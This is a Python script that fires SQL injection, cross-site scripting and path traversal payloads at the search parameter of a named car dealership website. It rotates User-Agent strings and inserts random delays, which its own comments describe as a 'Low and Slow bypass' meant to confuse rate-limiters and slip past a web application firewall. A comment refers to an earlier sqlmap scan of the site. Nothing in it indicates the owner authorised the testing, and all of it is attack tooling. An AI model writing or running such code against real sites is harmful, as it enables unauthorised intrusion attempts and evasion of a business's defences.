import requests
import time
import random

target_url = "https://www.montcalmautosales.com/search"
# A list of realistic User-Agents to rotate
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
]

# Payloads for the 's' parameter you found in your sqlmap scan
payloads = ["admin'", "' OR 1=1--", "<script>alert(1)</script>", "../../etc/passwd"]

def low_and_slow_scan():
    # Use a session to handle cookies automatically
    session = requests.Session()
    
    print(f"[*] Starting Low and Slow bypass on {target_url}...")
    
    for payload in payloads:
        headers = {'User-Agent': random.choice(user_agents)}
        params = {'s': payload}
        
        try:
            # Random delay between 3 and 10 seconds to confuse rate-limiters
            delay = random.uniform(3, 10)
            print(f"[*] Sleeping for {delay:.2f}s before sending payload: {payload}")
            time.sleep(delay)
            
            response = session.get(target_url, params=params, headers=headers, timeout=10)
            
            # Check if we were blocked vs if the page loaded
            if response.status_code == 200:
                print(f"[+] Success: Received 200 OK for payload '{payload}'")
            elif response.status_code == 403:
                print(f"[!] Blocked: WAF triggered for payload '{payload}'")
                
        except Exception as e:
            print(f"[X] Connection Error (Potential RST packet): {e}")

if __name__ == "__main__":
    low_and_slow_scan()
